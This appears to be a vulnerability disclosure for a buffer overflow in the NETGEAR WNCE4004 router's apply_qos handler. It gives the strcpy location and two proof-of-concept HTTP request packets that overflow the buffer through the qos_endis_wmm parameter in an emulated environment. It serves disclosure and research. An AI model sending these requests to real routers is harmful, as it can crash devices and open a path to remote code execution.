# Overview

- Manufacturer's website information：https://www.netgear.com/
- Firmware download address ：https://www.netgear.com/support/download/?model=WNCE4004

# Affected version

WNCE4004 1.0.0.34 and before

# Vulnerability description

A buffer overflow exists in the NETGEAR WNCE4004 router (firmware V1.0.0.34 and before).By accessing the `apply_qos` page, users can pass the payload to the `endis_wl_wmm` configuration item through the `qos_endis_wmm` parameter, which will cause a buffer overflow when accessing this path again. As a result, an attacker could cause a denial of service or potentially remote code execution.

# Vulnerability details

Uhttpd is a HTTP server mainly used to provide basic services for device management interfaces (such as Web configuration pages). 

Netgear uses uhttpd to handle HTTP requests, after accessing the `apply_qos` page, the `qos_endis_wmm` parameter is preserved in `endis_wl_wmm` in config. When accessing this path again, this config will be read from config and pass to a `strcpy` which casue the corruption.

# Vulnerability location

The call to strcpy at address `0x409B54` in the function `sub_409B00`. 

# Introduction

Vulnerability Research Environment:

Verification is carried out through simulation. **The current environment in the attachment has had the authentication step patched**, and the unpatched environment can be obtained by using binwalk to extract the corresponding firmware from the download link. I have included the rehost image `wnce4004_patched_env.tar.gz` in the directory.

Simulation is done using Greenhouse, and the Greenhouse link is [https://github.com/sefcom/greenhouse](https://github.com/sefcom/greenhouse). The specific commands for setting up the simulation environment can be found at [https://github.com/sefcom/greenhouse/blob/master/MANUAL.md](https://github.com/sefcom/greenhouse/blob/master/MANUAL.md).

No special configurations were made; the default simulation environment is used.

# Specific Verification Process

1. Unzip the `wnce4004_patched_env.tar.gz` and navigate to the dockerfile directory. Execute `docker-compise build` and `docker-compose up`

2. Send the first packet, setting the routing information to apply.cgi, which allows entry into the function sub_409B00. This function calls the do_setting function to extract the value of qos_endis_wmm from the URL and sets it as the value of endis_wl_wmm. `python send.py wnce4004/0x409B54/package1.json`

```json
{
  "request": {
    "method": "POST",
    "prefix": "/apply.cgi",
    "version": "1.1"
  },
  "header": {
    "Host": "123",
    "Content-Length": "1000"
  },
  "body":"qos_endis_wmm=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&qos_endis_wmm_a=2&submit_flag=apply_qos",
  "possible_type": "normal"
}
```
![alt text](image-1.png)
3. Send the second packet, setting the routing information to apply.cgi, which enters the function sub_409B00. This function propagates the value of endis_wl_wmm into the strcpy function, causing a buffer overflow. `python send.py wnce4004/0x409B54/package2.json`

```json
{
  "request": {
    "method": "POST",
    "prefix": "/apply.cgi",
    "version": "1.1"
  },
  "header": {
    "Host": "123",
    "Content-Length": "1000"
  },
  "body":"change_wan_type=1&submit_flag=apply_qos",
  "possible_type": "normal"
}
```
![alt text](image.png)